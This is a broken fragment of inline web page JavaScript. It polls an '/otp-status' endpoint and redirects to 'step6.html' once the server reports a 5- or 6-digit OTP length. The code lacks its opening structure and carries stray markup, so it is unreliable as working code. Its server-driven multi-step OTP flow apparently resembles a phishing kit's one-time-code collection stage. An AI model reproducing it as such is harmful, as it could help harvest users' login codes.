<div class="header"></div>

    </p>

// 🔵 FLOW 1: from earlier step → go to step5 after 5s

        const res = await fetch("/otp-status");
        const data = await res.json();

        if (data.otp === 5 || data.otp === 6) {
            isRedirecting = true;
            clearInterval(checker);

            localStorage.setItem("otpLength", data.otp);

            showLoaderAndGo("step6.html");
            return;
        }

    } catch (err) {
        console.log("Waiting...");
    }
}, 2000);

    document.body.classList.add("loaded");
};

</script>
